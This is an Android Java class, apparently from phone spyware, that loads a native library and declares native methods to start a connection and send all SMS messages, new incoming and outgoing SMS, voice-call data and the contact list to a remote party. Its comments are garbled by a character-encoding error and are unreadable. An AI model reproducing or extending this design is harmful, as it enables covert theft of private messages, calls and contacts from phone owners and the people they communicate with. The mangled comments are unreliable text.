package com.example.myphone;

import android.util.Log;

public class CPhone {
	static 
	{
		System.loadLibrary("MyPhone");
	}
	public static void foo()
	{
		Log.i("MyPhone", "foo");
	}
	
	/*
	 * �����ʼ�������ӷ�����
	 */
	public native void Start();
	/*
	 * �������ж������ݵ�������
	 */
	public native void SendAllSmsMsg(byte[] pByte, int nLen);	
	/*
	 * �����½��յ��Ķ������ݵ�������
	 */
	public native void SendNewInSms(byte[] pByte, int nLen);	
	/*
	 * �����·��͵Ķ������ݵ�������
	 */
	public native void SendNewOutSms(byte[] pByte, int nLen);	
	/*
	 * �����µ�����ͨѶ���ݵ�������
	 */
	public native void SendNewVoiceMsg(byte[] pByte, int nLen);	
	/*
	 * ������ϵ�����ݵ�������
	 */
	public native void SendContacts(byte[] pByte, int nLen);
}
